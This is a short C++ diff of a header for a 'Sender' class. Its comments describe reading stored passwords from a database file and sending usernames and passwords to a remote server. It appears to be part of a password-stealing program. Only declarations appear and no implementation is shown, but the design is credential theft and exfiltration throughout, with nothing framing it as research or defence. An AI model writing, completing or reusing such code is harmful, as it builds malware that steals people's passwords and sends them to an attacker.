@@ -12,11 +12,18 @@ using namespace std;
 class Sender
 {
 private:
-	static string url;
+	static LPCWSTR apiUrl;
 	static HINTERNET hConnect;
+
+	//callback function of sql_exec, it will call a function to send the password
 	static int sqlCallback(void* notUsed, int argc, char** argv, char** azColName);
+
+	//send the passwords to the server
 	static int sendData(string url, string username, string passwords);
+
+	//read the passwords from the database file
 	static void readPasswords(string dbPath);
 public:
+	//prepare the connection to send the passwords to server
 	static void sendPasswords(string dbPath);
 };
